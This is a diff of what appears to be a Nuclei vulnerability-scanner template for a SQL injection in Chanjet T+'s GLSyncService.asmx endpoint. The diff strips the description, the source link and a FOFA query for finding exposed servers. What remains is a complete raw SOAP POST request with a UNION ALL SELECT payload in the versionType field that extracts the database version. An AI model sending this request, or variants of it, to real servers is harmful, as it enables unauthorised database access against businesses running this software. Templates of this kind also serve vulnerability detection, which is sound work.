@@ -3,12 +3,8 @@ info:
   name: 畅捷通T+ GLSyncService.asmx 存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/bf5tz33gr1zxitgi'
+  description: ''
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: bf5tz33gr1zxitgi
-    fofa: app="畅捷通-TPlus"
 http:
 - raw:
   - "POST /tplus/GLSyncService.asmx HTTP/1.1\nHost: {{Hostname}}\nContent-Type: text/xml; charset=utf-8\nContent-Length: length\nSOAPAction: \"http://www.chanjet.com/GetSourceAccountDataTable\"\n\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<soap:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\">\n  <soap:Body>\n    <GetSourceAccountDataTable xmlns=\"http://www.chanjet.com/\">\n      <versionType>' UNION ALL SELECT NULL,@@VERSION,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- VsIH</versionType>\n    </GetSourceAccountDataTable>\n  </soap:Body>\n</soap:Envelope>"
